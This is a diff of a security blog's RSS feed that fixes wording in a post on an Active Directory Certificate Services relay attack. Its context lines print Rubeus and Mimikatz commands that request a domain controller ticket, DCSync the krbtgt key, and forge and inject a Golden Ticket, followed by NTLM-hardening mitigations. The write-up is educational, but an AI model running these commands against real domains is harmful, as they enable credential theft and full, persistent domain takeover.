@@ -109,14 +109,14 @@ Original research was done by <a href="https://twitter.com/harmj0y">Will Schroed
 <pre tabindex="0"><code>Rubeus.exe asktgt /user:DC$ /domain:&lt;domain&gt; /certificate:&lt;base64-certificate&gt; /ptt
 </code></pre><p>With the <code>/ptt</code> option, the returned TGT of DC$ would be imported into my current user session.
 <br>
-From here, a threat actor aim for the highest prize by dumping the AES256 encryption key of the krbtgt account to forge a Golden Ticket:
+From here, a threat actor can aim for the highest prize by dumping the AES256 encryption key of the krbtgt account to forge a Golden Ticket:
 Launch Mimikatz and dump the AES256 encryption key:</p>
 <pre tabindex="0"><code># From mimikatz:
 lsadump::dcsync /domain:&lt;domain&gt; /user:krbtgt
 </code></pre><p>Once the AES256 encryption key of the krbtgt account was captured, the Golden Ticket could be forged:</p>
 <pre tabindex="0"><code># From Mimikatz:
 kerberos::golden /user:Administrator /domain:&lt;domain&gt; /sid:&lt;SID of the domain&gt; /aes256:&lt;aes256 key&gt; /ticket:goldie.kirbi
-</code></pre><p>Proceeded to inject the golden ticket:</p>
+</code></pre><p>Proceeded to inject the Golden Ticket:</p>
 <pre tabindex="0"><code>Rubeus.exe ptt /ticket:goldie.kirbi
 </code></pre><p>GG!</p>
 <h2 id="mitigation">Mitigation</h2>
@@ -126,9 +126,9 @@ kerberos::golden /user:Administrator /domain:&lt;domain&gt; /sid:&lt;SID of the 
 <li>Disable NTLM Authentication on Windows Domain Controllers.</li>
 <li>Disable NTLM on any ADCS server using Group Policy.</li>
 <li>Disable NTLM for Internet Information Services (IIS) on AD CS Servers in the domain running the &ldquo;Certificate Authority Web Enrollment&rdquo; or &ldquo;Certificate Enrollment Web Service&rdquo; services.
-<br>
-More information can be found <a href="https://support.microsoft.com/en-gb/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429?ranMID=46131&amp;ranEAID=a1LgFw09t88&amp;ranSiteID=a1LgFw09t88-Ug.hyM7w8Zm3RQRUQGEifA&amp;epi=a1LgFw09t88-Ug.hyM7w8Zm3RQRUQGEifA&amp;irgwc=1&amp;OCID=AID2200057_aff_7806_1243925&amp;tduid=%28ir__pbc1z9tr09kf62lfkn9aaeqtum2xtbsisdfgml0c00%29%287806%29%281243925%29%28a1LgFw09t88-Ug.hyM7w8Zm3RQRUQGEifA%29%28%29&amp;irclickid=_pbc1z9tr09kf62lfkn9aaeqtum2xtbsisdfgml0c00">here</a></li>
+\</li>
 </ul>
+<p>More information can be found <a href="https://support.microsoft.com/en-gb/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429?ranMID=46131&amp;ranEAID=a1LgFw09t88&amp;ranSiteID=a1LgFw09t88-Ug.hyM7w8Zm3RQRUQGEifA&amp;epi=a1LgFw09t88-Ug.hyM7w8Zm3RQRUQGEifA&amp;irgwc=1&amp;OCID=AID2200057_aff_7806_1243925&amp;tduid=%28ir__pbc1z9tr09kf62lfkn9aaeqtum2xtbsisdfgml0c00%29%287806%29%281243925%29%28a1LgFw09t88-Ug.hyM7w8Zm3RQRUQGEifA%29%28%29&amp;irclickid=_pbc1z9tr09kf62lfkn9aaeqtum2xtbsisdfgml0c00">here</a></p>
 ]]></content></item><item><title>Certified Red Team Professional (CRTP) by Pentester Academy Review</title><link>https://jakemai0.github.io/posts/crtp/</link><pubDate>Tue, 01 Feb 2022 00:00:00 +0000</pubDate><guid>https://jakemai0.github.io/posts/crtp/</guid><description>Introduction Work in Progress</description><content type="html">&lt;h2 id="introduction">Introduction&lt;/h2>
 &lt;p>Work in Progress&lt;/p></content></item><item><title>Offensive Security Certified Professional (OSCP) Review</title><link>https://jakemai0.github.io/posts/oscp/</link><pubDate>Wed, 01 Dec 2021 00:00:00 +0000</pubDate><guid>https://jakemai0.github.io/posts/oscp/</guid><description>Introduction Work in Progress</description><content type="html">&lt;h2 id="introduction">Introduction&lt;/h2>
 &lt;p>Work in Progress&lt;/p></content></item></channel></rss>
